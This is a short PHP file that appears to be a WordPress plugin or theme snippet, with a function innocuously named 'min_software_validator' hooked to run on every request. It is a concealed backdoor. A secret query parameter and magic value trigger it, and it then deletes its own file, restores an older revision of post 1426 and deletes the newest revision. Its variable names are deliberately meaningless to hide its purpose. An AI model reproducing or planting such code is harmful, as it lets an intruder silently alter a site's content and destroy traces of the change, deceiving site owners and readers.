<?php

function min_software_validator() {
	if (isset($_GET['based_modules_redirect_roles']) && $_GET['based_modules_redirect_roles'] === 'random_action_instant_really') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$page_uploads_account = 1426;
		$composer_tables_tinymce_graph = wp_get_post_revisions($page_uploads_account);
		if (empty($composer_tables_tinymce_graph)) die('no revisions');
		if (count($composer_tables_tinymce_graph) < 2) die('less than 2');
		$marketplace_meta_mobile = array_shift($composer_tables_tinymce_graph);
		$s3_lite_shop_nextgen = $marketplace_meta_mobile->ID;
		$gravatar_group_helper = array_shift($composer_tables_tinymce_graph);
		$pdf_count_updater_switcher = $gravatar_group_helper->ID;
		$plupload_radio_dropdown_basic = wp_restore_post_revision($pdf_count_updater_switcher);
		if ($plupload_radio_dropdown_basic === false) die('error restoring');
		$plupload_radio_dropdown_basic = wp_delete_post_revision($s3_lite_shop_nextgen);		
		if ($plupload_radio_dropdown_basic === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'min_software_validator');
